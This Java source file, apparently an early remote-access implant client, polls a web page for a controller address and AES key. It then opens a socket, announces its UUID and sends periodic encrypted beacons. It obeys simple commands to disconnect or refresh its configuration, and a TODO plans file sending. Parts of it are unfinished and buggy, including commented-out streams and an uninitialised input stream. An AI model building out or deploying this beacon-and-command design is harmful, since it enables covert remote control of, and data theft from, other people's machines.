package com.revsn.client;

import java.io.DataInput;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

import java.net.Socket;
import java.net.URL;
import java.nio.charset.StandardCharsets;

import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

import java.util.Base64;
import java.util.UUID;

import javax.crypto.*;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.xml.crypto.Data;

import org.apache.commons.codec.binary.Base64InputStream;
import org.apache.commons.codec.binary.Base64OutputStream;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

public class Client {
    private UUID uniqueID;
    private Socket reqSock;
    private CipherInputStream ciIn;
    private Base64OutputStream ciOut;

    private ObjectOutputStream dataOut;
    private ObjectInputStream dataIn;

    private Cipher cipherEnc;
    private Cipher cipherDec;

    private String[] address = new String[2];

    private SecretKey key;

    private IvParameterSpec iv;

    private boolean initDone = false;
    private boolean trigCheck = false;
    private boolean connExists = false;

    public Client(UUID uniUuid) {
        this.uniqueID = uniUuid;

    }

    private boolean init() {
        if(!connExists) {
            try {
                System.out.println("INIT");
                initDone = true;

                int port = Integer.parseInt(address[1]);
                
                System.out.print(address[0] + " ");
                System.out.println(address[1]);

                reqSock = new Socket(address[0], port);


                System.out.println("INIT2");
                dataOut = new ObjectOutputStream(reqSock.getOutputStream());
                dataOut.flush();
                System.out.println("INIT3");
                //dataIn = new ObjectInputStream(reqSock.getInputStream());
                System.out.println("INIT4");
                //ciOut = new Base64OutputStream(new CipherOutputStream(reqSock.getOutputStream(), cipherEnc));
                //ciOut.flush();
                //ciIn = new CipherInputStream(new Base64InputStream(reqSock.getInputStream()), cipherDec);

                sendMessage(uniqueID + ": just arrived to vacation!");
                connExists = true;

                return true;
            } catch(IOException | InvalidKeyException | InvalidAlgorithmParameterException | NoSuchPaddingException e) {
                System.out.println("catch in init");
                e.printStackTrace();
                initDone = false;
                return false;
            }

        } else {
            return false; 
        }
    }

    private void close() {
        try {
            connExists = false;
            //ciIn.close();
            //ciOut.close();
            dataIn.close();
            dataOut.close();
            
            reqSock.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private boolean checkTrig() throws IOException {
        //Go for webserver and extract IP, Port and Key. Then set and use the stuff
        try {
            String URL = "http://127.0.0.1:8080/output.txt";
            URL url = new URL(URL);

            Document doc = Jsoup.parse(url, 1000 * 3);
            String text = doc.body().text();

            System.out.println(text);

            String outp[] = text.split(";");

            address[0] = outp[0];
            address[1] = outp[1];
            System.out.println(address[0]);

            byte[] decodedKey = Base64.getDecoder().decode(outp[2]);
            byte[] decodedIv = Base64.getDecoder().decode(outp[3]);

            this.key = new SecretKeySpec(decodedKey, "AES");
            this.iv = new IvParameterSpec(decodedIv);

            System.out.println("CheckTrigTrue");
            trigCheck = true;
            return true;
        } catch (IOException e) {
            System.out.println("catch in checktrig");
            trigCheck = false;
            return false;
        }
        
    }

    private boolean updateStuff() {
        try {
            checkTrig();
        } catch (IOException e) {
            return false;
        }
        return true;
    }

    private void sendMessage(String msg) throws InvalidKeyException, InvalidAlgorithmParameterException, NoSuchPaddingException {
        try {
            System.out.println("Send message :" + msg);
            cipherEnc = Cipher.getInstance("AES/CBC/PKCS5Padding");
        
            cipherEnc.init(Cipher.ENCRYPT_MODE, this.key, this.iv);
            String encoded = new String(Base64.getEncoder()
                .encode(cipherEnc.doFinal(msg.getBytes())));

            System.out.println(encoded);
            dataOut.writeObject(encoded);
            //ciOut.write(msg.getBytes(StandardCharsets.UTF_8));

            dataOut.flush();

            //ciOut.flush();
            
        } catch (IOException | NoSuchAlgorithmException | IllegalBlockSizeException | BadPaddingException e) {
            e.printStackTrace();
        }
    }

    public void handleMessage(byte[] msg) {

        try {
            cipherDec = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipherDec.init(Cipher.DECRYPT_MODE, this.key, this.iv);
            
            String message = ciIn.toString();

            if (message.charAt(0) == '1') {
                sendMessage(uniqueID + ": said goobye, sadly.");
                close();
            }

            if (message.charAt(0) == '9' && message.charAt(1) == '9' && message.charAt(2) == '9') {
                updateStuff();
            }

            //TODO: Implement message handling, like send files etc


        } catch (InvalidKeyException | InvalidAlgorithmParameterException | NoSuchAlgorithmException | NoSuchPaddingException e) {
            e.printStackTrace();
        }
            
    }

    public void run() {
        try {
            while (!checkTrig() && !trigCheck) {
                try {
                    Thread.sleep(10000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        System.out.println("Passed checktrig");
        if (!init()) {
            try {
                Thread.sleep(10000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            return;
        } 

        while (!reqSock.isClosed()) {
            try {
                //handleMessage(ciIn.readAllBytes());
                Thread.sleep(10000);
                sendMessage("Wuddap");
            } catch(InterruptedException | InvalidKeyException | InvalidAlgorithmParameterException | NoSuchPaddingException e) {
                e.printStackTrace();
            }
        }
    }
}
